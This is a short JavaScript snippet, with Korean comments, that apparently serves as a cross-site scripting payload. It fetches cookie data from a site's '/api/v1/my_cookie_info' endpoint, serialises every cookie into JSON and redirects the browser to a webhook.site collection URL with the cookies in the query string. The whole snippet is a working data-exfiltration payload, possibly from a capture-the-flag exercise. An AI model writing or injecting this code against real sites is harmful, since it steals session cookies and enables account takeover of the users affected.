fetch("/api/v1/my_cookie_info")
    .then((response) => response.json())
    .then((data) => {
        // 모든 쿠키 데이터를 JSON 문자열로 변환
        var allCookies = JSON.stringify(data.cookies);

        // location.href로 웹훅 사이트로 쿠키 값을 전달하며 페이지 이동
        location.href = "https://webhook.site/4abb2b29-16db-4d83-b99e-86818bc20491?q=" + encodeURIComponent(allCookies);
    })
    .catch((error) => {
        console.error("Error fetching cookie info:", error);
    });
